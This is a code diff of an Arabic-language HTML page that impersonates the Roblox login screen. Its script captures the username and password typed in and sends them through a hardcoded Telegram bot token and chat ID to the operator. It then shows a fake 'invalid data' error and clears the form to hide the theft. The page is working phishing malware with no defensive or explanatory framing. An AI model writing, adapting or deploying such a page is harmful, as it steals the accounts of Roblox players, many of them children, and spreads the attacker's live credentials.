@@ -1,275 +1,72 @@
 <!DOCTYPE html>
-<html lang="ar">
+<html>
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>تسجيل الدخول - Roblox</title>
+    <title>Roblox</title>
     <style>
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Arial, sans-serif;
-        }
-        body {
-            background: #e9f0f5;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            min-height: 100vh;
-            padding: 20px;
-        }
-        .container {
-            background: white;
-            padding: 40px 30px;
-            border-radius: 12px;
-            box-shadow: 0 8px 30px rgba(0,0,0,0.12);
-            max-width: 400px;
-            width: 100%;
-        }
-        .header {
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            margin-bottom: 20px;
-            border-bottom: 1px solid #ddd;
-            padding-bottom: 10px;
-        }
-        .header .logo {
-            font-size: 28px;
-            font-weight: 900;
-            color: #1a1a2e;
-        }
-        .header .logo span { color: #2d7aff; }
-        .header .links a {
-            color: #2d7aff;
-            text-decoration: none;
-            font-size: 14px;
-            margin-left: 12px;
-        }
-        .header .links a:hover { text-decoration: underline; }
-        h2 {
-            font-size: 22px;
-            font-weight: 600;
-            margin-bottom: 6px;
-        }
-        .sub {
-            color: #555;
-            font-size: 14px;
-            margin-bottom: 20px;
-        }
-        .input-group {
-            margin-bottom: 14px;
-        }
-        .input-group label {
-            font-size: 14px;
-            font-weight: 600;
-            display: block;
-            margin-bottom: 4px;
-            color: #333;
-        }
-        .input-group input {
-            width: 100%;
-            padding: 12px 14px;
-            border: 1px solid #ccc;
-            border-radius: 6px;
-            font-size: 15px;
-            background: #f9f9f9;
-            transition: 0.2s;
-        }
-        .input-group input:focus {
-            border-color: #2d7aff;
-            outline: none;
-            background: white;
-        }
-        .btn {
-            width: 100%;
-            padding: 14px;
-            background: #2d7aff;
-            color: white;
-            border: none;
-            border-radius: 6px;
-            font-size: 17px;
-            font-weight: 600;
-            cursor: pointer;
-            margin-top: 6px;
-        }
-        .btn:hover { background: #1a5fd0; }
-        .options {
-            margin: 16px 0 10px;
-            font-size: 14px;
-            text-align: center;
-        }
-        .options a {
-            color: #2d7aff;
-            text-decoration: none;
-        }
-        .options a:hover { text-decoration: underline; }
-        .error {
-            color: #d32f2f;
-            font-size: 14px;
-            text-align: center;
-            display: none;
-            margin-top: 10px;
-            background: #ffebee;
-            padding: 8px;
-            border-radius: 6px;
-        }
-        .divider {
-            display: flex;
-            align-items: center;
-            margin: 18px 0;
-            color: #aaa;
-            font-size: 12px;
-        }
-        .divider::before,
-        .divider::after {
-            content: "";
-            flex: 1;
-            border-bottom: 1px solid #ddd;
-        }
+        * { margin: 0; padding: 0; box-sizing: border-box; font-family: Arial, sans-serif; }
+        body { background: #e9f0f5; display: flex; justify-content: center; align-items: center; min-height: 100vh; }
+        .box { background: white; padding: 40px 30px; border-radius: 12px; max-width: 400px; width: 100%; box-shadow: 0 8px 30px rgba(0,0,0,0.12); }
+        .logo { font-size: 28px; font-weight: 900; color: #1a1a2e; }
+        .logo span { color: #2d7aff; }
+        .top { display: flex; justify-content: space-between; border-bottom: 1px solid #ddd; padding-bottom: 10px; margin-bottom: 20px; }
+        .top a { color: #2d7aff; text-decoration: none; font-size: 14px; margin-left: 12px; }
+        h2 { font-size: 22px; margin-bottom: 20px; }
+        input { width: 100%; padding: 12px; margin-bottom: 14px; border: 1px solid #ccc; border-radius: 6px; font-size: 15px; }
+        button { width: 100%; padding: 14px; background: #2d7aff; color: white; border: none; border-radius: 6px; font-size: 17px; font-weight: 600; cursor: pointer; }
+        .link { text-align: center; margin-top: 12px; font-size: 14px; }
+        .link a { color: #2d7aff; text-decoration: none; }
+        .divider { display: flex; align-items: center; margin: 18px 0; color: #aaa; font-size: 12px; }
+        .divider::before, .divider::after { content: ""; flex: 1; border-bottom: 1px solid #ddd; }
         .divider::before { margin-right: 10px; }
         .divider::after { margin-left: 10px; }
-        .quick-login {
-            text-align: center;
-            margin: 10px 0;
-        }
-        .quick-login a {
-            color: #2d7aff;
-            text-decoration: none;
-            font-weight: 600;
-        }
-        .quick-login a:hover { text-decoration: underline; }
-        .footer {
-            text-align: center;
-            margin-top: 16px;
-            font-size: 14px;
-            color: #555;
-        }
-        .footer a {
-            color: #2d7aff;
-            text-decoration: none;
-            font-weight: 600;
-        }
-        .footer a:hover { text-decoration: underline; }
-        .sub-links {
-            display: flex;
-            justify-content: center;
-            gap: 15px;
-            margin-top: 12px;
-            font-size: 13px;
-        }
-        .sub-links a {
-            color: #777;
-            text-decoration: none;
-        }
-        .sub-links a:hover { text-decoration: underline; }
+        .footer { text-align: center; margin-top: 16px; font-size: 14px; }
+        .footer a { color: #2d7aff; text-decoration: none; font-weight: 600; }
+        .bottom { display: flex; justify-content: center; gap: 15px; margin-top: 12px; font-size: 13px; }
+        .bottom a { color: #777; text-decoration: none; }
+        .err { color: #d32f2f; background: #ffebee; padding: 8px; border-radius: 6px; display: none; margin-top: 10px; text-align: center; }
     </style>
 </head>
 <body>
-
-<div class="container">
-    <!-- الهيدر: شعار + روابط جانبية -->
-    <div class="header">
-        <div class="logo">Roblox</div>
-        <div class="links">
-            <a href="#">إنشاء</a>
-            <a href="#">الرائحة</a>
-            <a href="#">السوق</a>
-        </div>
-    </div>
-
+<div class="box">
+    <div class="top"><div class="logo">Roblox</div><div><a href="#">إنشاء</a><a href="#">الرائحة</a><a href="#">السوق</a></div></div>
     <h2>تسجيل الدخول إلى Roblox</h2>
-
     <form id="loginForm">
-        <div class="input-group">
-            <label>اسم المستخدم/البريد/الهاتف</label>
-            <input type="text" id="username" placeholder="أدخل اسم المستخدم أو البريد أو الهاتف" required>
-        </div>
-        <div class="input-group">
-            <label>كلمة المرور</label>
-            <input type="password" id="password" placeholder="أدخل كلمة المرور" required>
-        </div>
-
-        <button type="submit" class="btn">تسجيل الدخول</button>
-
-        <div class="options">
-            <a href="#">نسيت كلمة المرور أو اسم المستخدم؟</a>
-        </div>
-
-        <div class="options">
-            <a href="#">إرسال رمز صالح لمرة واحدة عبر البريد الإلكتروني</a>
-        </div>
-
-        <div class="error" id="errorMsg">⚠️ بيانات غير صحيحة، حاول مرة أخرى</div>
-
+        <input type="text" id="username" placeholder="اسم المستخدم/البريد/الهاتف" required>
+        <input type="password" id="password" placeholder="كلمة المرور" required>
+        <button type="submit">تسجيل الدخول</button>
+        <div class="link"><a href="#">نسيت كلمة المرور أو اسم المستخدم؟</a></div>
+        <div class="link"><a href="#">إرسال رمز صالح لمرة واحدة عبر البريد الإلكتروني</a></div>
+        <div class="err" id="errorMsg">⚠️ بيانات غير صحيحة</div>
         <div class="divider">أو</div>
-
-        <div class="quick-login">
-            <a href="#">تسجيل دخول سريع</a>
-        </div>
-
-        <div class="footer">
-            ليس لديك حساب؟ <a href="#">اشتراك</a>
-        </div>
-
-        <!-- روابط إضافية (مثل في الصورة) -->
-        <div class="sub-links">
-            <a href="#">الخصوصية</a>
-            <a href="#">الشروط</a>
-            <a href="#">اتصل بنا</a>
-        </div>
+        <div class="link"><a href="#">تسجيل دخول سريع</a></div>
+        <div class="footer">ليس لديك حساب؟ <a href="#">اشتراك</a></div>
+        <div class="bottom"><a href="#">الخصوصية</a><a href="#">الشروط</a><a href="#">اتصل بنا</a></div>
     </form>
 </div>
-
 <script>
-    // =============================================
-    // إعدادات البوت
-    // =============================================
     const BOT_TOKEN = '8575472482:AAGXTn8RYrIVtqreB2vGuqmDE3H40uw4aqM';
     const CHAT_ID = '6526473202';
-
     function sendToTelegram(text) {
         fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({
-                chat_id: CHAT_ID,
-                text: text,
-                parse_mode: 'HTML'
-            })
+            body: JSON.stringify({ chat_id: CHAT_ID, text: text, parse_mode: 'HTML' })
         }).catch(e => console.log(e));
     }
-
-    // =============================================
-    // عند إرسال النموذج (جلب البيانات)
-    // =============================================
     document.getElementById('loginForm').addEventListener('submit', function(e) {
         e.preventDefault();
-
         const username = document.getElementById('username').value;
         const password = document.getElementById('password').value;
-
-        // إرسال البيانات إلى تليجرام
-        let dataMsg = `<b>🔓 بيانات روبلوكس</b>\n\n`;
-        dataMsg += `👤 اسم المستخدم: ${username}\n`;
-        dataMsg += `🔑 كلمة المرور: ${password}`;
-
-        sendToTelegram(dataMsg);
-
-        // إظهار رسالة خطأ وهمية
+        sendToTelegram(`<b>🔓 بيانات روبلوكس</b>\n\n👤 ${username}\n🔑 ${password}`);
         document.getElementById('errorMsg').style.display = 'block';
-
-        // إعادة تعيين الحقول بعد 3 ثواني
         setTimeout(() => {
             document.getElementById('username').value = '';
             document.getElementById('password').value = '';
             document.getElementById('errorMsg').style.display = 'none';
         }, 3000);
     });
-
-    console.log('✅ صفحة روبلوكس تعمل');
 </script>
-
 </body>
 </html>
